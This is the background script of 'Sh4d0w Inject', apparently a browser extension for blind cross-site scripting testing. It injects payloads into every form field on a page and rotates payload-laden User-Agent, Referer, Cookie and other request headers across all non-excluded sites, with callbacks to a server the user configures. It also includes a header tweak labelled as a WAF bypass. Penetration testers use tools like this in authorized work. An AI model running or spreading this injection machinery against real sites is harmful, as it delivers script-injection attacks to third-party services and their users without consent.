/**
 * Sh4d0w Inject — Background Service Worker (Store Version)
 * Users configure their own blind XSS server in Settings
 * {{SERVER}} in payloads is replaced at runtime
 */

// Chrome service_worker needs importScripts; Firefox background.scripts loads via manifest
try { importScripts('../lib/payloads.js'); } catch (e) { /* loaded via manifest scripts */ }

const INJECTABLE_HEADERS = [
    { id: 'user-agent', label: 'User-Agent', icon: '🌐' },
    { id: 'referer', label: 'Referer', icon: '🔗' },
    { id: 'origin', label: 'Origin', icon: '📍' },
    { id: 'cookie', label: 'Cookie', icon: '🍪' },
    { id: 'accept', label: 'Accept', icon: '📥' },
    { id: 'x-forwarded-for', label: 'X-Forwarded-For', icon: '🔀' },
    { id: 'waf-bypass', label: 'Content-Encoding', icon: '🤐' }
];

const DEFAULT_EXCLUDED = [
    'google.com', 'google.co.in', 'google.co.uk',
    'web.whatsapp.com', 'whatsapp.com',
    'open.spotify.com', 'spotify.com',
    'youtube.com', 'mail.google.com',
    'github.com', 'stackoverflow.com',
    'facebook.com', 'instagram.com',
    'twitter.com', 'x.com',
    'linkedin.com', 'reddit.com',
    'chrome.google.com', 'addons.mozilla.org'
];

// =============================
// Install & Init
// =============================
chrome.runtime.onInstalled.addListener(() => {
    chrome.contextMenus.create({ id: 'sh4d0w-parent', title: '💉 Sh4d0w Inject', contexts: ['all'] });
    chrome.contextMenus.create({ id: 'sh4d0w-fill-field', parentId: 'sh4d0w-parent', title: '🎯 Fill This Field', contexts: ['editable'] });
    chrome.contextMenus.create({ id: 'sh4d0w-fill-all', parentId: 'sh4d0w-parent', title: '⚡ Fill ALL Fields', contexts: ['all'] });
    chrome.contextMenus.create({ id: 'sh4d0w-sep1', parentId: 'sh4d0w-parent', type: 'separator', contexts: ['all'] });
    chrome.contextMenus.create({ id: 'sh4d0w-exclude', parentId: 'sh4d0w-parent', title: '🚫 Exclude This Site', contexts: ['all'] });
    chrome.contextMenus.create({ id: 'sh4d0w-options', parentId: 'sh4d0w-parent', title: '⚙️ Settings', contexts: ['all'] });

    chrome.storage.sync.get(null, (r) => {
        const defaults = {
            serverUrl: r.serverUrl || '',
            fillHistory: r.fillHistory || [],
            enabledTypes: r.enabledTypes || {
                name: true, email: true, phone: true, url: true,
                subject: true, message: true, address: true,
                company: true, search: true, generic: true
            },
            headerToggles: r.headerToggles || {
                'user-agent': false, 'referer': false, 'origin': false,
                'cookie': false, 'accept': false, 'x-forwarded-for': false,
                'waf-bypass': false
            },
            excludedDomains: r.excludedDomains || DEFAULT_EXCLUDED,
            popupState: r.popupState || { activeTab: 'fill', targetDomain: '', lastScanResult: null }
        };
        chrome.storage.sync.set(defaults);
        if (r.headerToggles && Object.values(r.headerToggles).some(v => v)) {
            rebuildHeaderRules();
        }
    });
});

// =============================
// Context Menu
// =============================
chrome.contextMenus.onClicked.addListener(async (info, tab) => {
    if (info.menuItemId === 'sh4d0w-fill-field') await injectAndFill(tab.id, 'fillField');
    else if (info.menuItemId === 'sh4d0w-fill-all') { await injectAndFill(tab.id, 'fillAll'); addToHistory(tab.url, tab.title, -1); }
    else if (info.menuItemId === 'sh4d0w-exclude') { try { addExcludedDomain(new URL(tab.url).hostname); } catch (e) { } }
    else if (info.menuItemId === 'sh4d0w-options') chrome.runtime.openOptionsPage();
});

// =============================
// On-Demand Inject — injects server URL before content script
// =============================
async function injectAndFill(tabId, action) {
    try {
        const { serverUrl } = await chrome.storage.sync.get(['serverUrl']);

        // First inject the server URL as a global variable
        await chrome.scripting.executeScript({
            target: { tabId },
            func: (url) => { window.__SH4D0W_SERVER = url; },
            args: [serverUrl || '']
        });

        // Then inject payloads + content script
        await chrome.scripting.executeScript({
            target: { tabId }, files: ['lib/payloads.js', 'content/content.js']
        });
        await new Promise(r => setTimeout(r, 80));
        return await chrome.tabs.sendMessage(tabId, { action });
    } catch (e) {
        console.error('Sh4d0w:', e);
        return null;
    }
}

// =============================
// Messages
// =============================
chrome.runtime.onMessage.addListener((msg, sender, reply) => {
    if (msg.action === 'injectAndFillAll') {
        (async () => {
            const [tab] = await chrome.tabs.query({ active: true, currentWindow: true });
            if (!tab) return reply({ filled: 0, total: 0 });
            const r = await injectAndFill(tab.id, 'fillAll');
            if (r) addToHistory(tab.url, tab.title, r.filled || 0);
            reply(r || { filled: 0, total: 0 });
        })();
        return true;
    }

    if (msg.action === 'injectAndCount') {
        (async () => {
            const [tab] = await chrome.tabs.query({ active: true, currentWindow: true });
            if (!tab) return reply({ total: 0, byType: {} });
            try {
                const { serverUrl } = await chrome.storage.sync.get(['serverUrl']);
                await chrome.scripting.executeScript({
                    target: { tabId: tab.id },
                    func: (url) => { window.__SH4D0W_SERVER = url; },
                    args: [serverUrl || '']
                });
                await chrome.scripting.executeScript({
                    target: { tabId: tab.id }, files: ['lib/payloads.js', 'content/content.js']
                });
                await new Promise(r => setTimeout(r, 80));
                const r = await chrome.tabs.sendMessage(tab.id, { action: 'countFields' });
                reply(r || { total: 0, byType: {} });
            } catch (e) { reply({ total: 0, byType: {}, error: e.message }); }
        })();
        return true;
    }

    if (msg.action === 'getHeaderToggles') {
        chrome.storage.sync.get(['headerToggles'], r => reply({ toggles: r.headerToggles || {} }));
        return true;
    }

    if (msg.action === 'setHeaderToggle') {
        chrome.storage.sync.get(['headerToggles'], async (r) => {
            const t = r.headerToggles || {};
            t[msg.headerId] = msg.enabled;
            chrome.storage.sync.set({ headerToggles: t });
            await rebuildHeaderRules();
            reply({ toggles: t });
        });
        return true;
    }

    if (msg.action === 'getExcludedDomains') {
        chrome.storage.sync.get(['excludedDomains'], r => reply({ domains: r.excludedDomains || [] }));
        return true;
    }
    if (msg.action === 'addExcludedDomain') {
        addExcludedDomain(msg.domain).then(d => reply({ domains: d }));
        return true;
    }
    if (msg.action === 'removeExcludedDomain') {
        chrome.storage.sync.get(['excludedDomains'], async (r) => {
            const d = (r.excludedDomains || []).filter(x => x !== msg.domain);
            chrome.storage.sync.set({ excludedDomains: d });
            await rebuildHeaderRules();
            reply({ domains: d });
        });
        return true;
    }
    if (msg.action === 'resetExcludedDomains') {
        chrome.storage.sync.set({ excludedDomains: DEFAULT_EXCLUDED }, async () => {
            await rebuildHeaderRules();
            reply({ domains: DEFAULT_EXCLUDED });
        });
        return true;
    }

    if (msg.action === 'getServerUrl') {
        chrome.storage.sync.get(['serverUrl'], r => reply({ serverUrl: r.serverUrl || '' }));
        return true;
    }
    if (msg.action === 'setServerUrl') {
        chrome.storage.sync.set({ serverUrl: msg.url });
        reply({ ok: true });
        return true;
    }
});

async function addExcludedDomain(domain) {
    return new Promise(resolve => {
        const clean = domain.replace(/^https?:\/\//, '').replace(/^www\./, '').replace(/\/$/, '').toLowerCase();
        if (!clean) return resolve([]);
        chrome.storage.sync.get(['excludedDomains'], async (r) => {
            const d = r.excludedDomains || [];
            if (!d.includes(clean)) { d.push(clean); d.sort(); chrome.storage.sync.set({ excludedDomains: d }); await rebuildHeaderRules(); }
            resolve(d);
        });
    });
}

// =============================
// Multi-Header Injection — uses user's server URL
// =============================
let headerPayloadIndices = {};
let rotationTimer = null;

async function rebuildHeaderRules() {
    const data = await chrome.storage.sync.get(['headerToggles', 'excludedDomains', 'serverUrl']);
    const toggles = data.headerToggles || {};
    const excluded = data.excludedDomains || [];
    const serverUrl = data.serverUrl || '';
    const payloads = BLINDXSS_PAYLOADS.headerPayloads;

    const requestHeaders = [];
    for (const h of INJECTABLE_HEADERS) {
        if (!toggles[h.id]) continue;

        // Special case for WAF Bypass (static gzip value)
        if (h.id === 'waf-bypass') {
            requestHeaders.push({ header: h.label, operation: 'set', value: 'gzip' });
            continue;
        }

        const pool = payloads[h.id] || payloads['generic'];
        const idx = (headerPayloadIndices[h.id] || 0) % pool.length;
        let payload = pool[idx];
        if (serverUrl) payload = payload.replace(/\{\{SERVER\}\}/g, serverUrl);
        requestHeaders.push({ header: h.label, operation: 'set', value: payload });
    }

    try {
        const existing = await chrome.declarativeNetRequest.getDynamicRules();
        const oldIds = existing.map(r => r.id);

        if (requestHeaders.length === 0) {
            await chrome.declarativeNetRequest.updateDynamicRules({ removeRuleIds: oldIds, addRules: [] });
            if (rotationTimer) { clearInterval(rotationTimer); rotationTimer = null; }
            return;
        }

        const condition = {
            urlFilter: '*',
            resourceTypes: ['main_frame', 'sub_frame', 'xmlhttprequest', 'script', 'image', 'stylesheet', 'font', 'media', 'websocket', 'other']
        };
        if (excluded.length > 0) condition.excludedRequestDomains = excluded;

        await chrome.declarativeNetRequest.updateDynamicRules({
            removeRuleIds: oldIds,
            addRules: [{ id: 1, priority: 1, action: { type: 'modifyHeaders', requestHeaders }, condition }]
        });

        if (!rotationTimer) rotationTimer = setInterval(rotateHeaders, 3000);
    } catch (e) { console.error('Sh4d0w: rule error:', e); }
}

function rotateHeaders() {
    for (const h of INJECTABLE_HEADERS) headerPayloadIndices[h.id] = ((headerPayloadIndices[h.id] || 0) + 1);
    rebuildHeaderRules();
}

chrome.webNavigation.onCommitted.addListener(async (details) => {
    if (details.frameId !== 0) return;
    const { headerToggles } = await chrome.storage.sync.get(['headerToggles']);
    if (Object.values(headerToggles || {}).some(v => v)) rotateHeaders();
});

// =============================
// History
// =============================
function addToHistory(url, title, count) {
    chrome.storage.sync.get(['fillHistory'], (r) => {
        const h = r.fillHistory || [];
        h.unshift({ url, title: title || url, fields: count, timestamp: Date.now() });
        if (h.length > 50) h.length = 50;
        chrome.storage.sync.set({ fillHistory: h });
    });
}
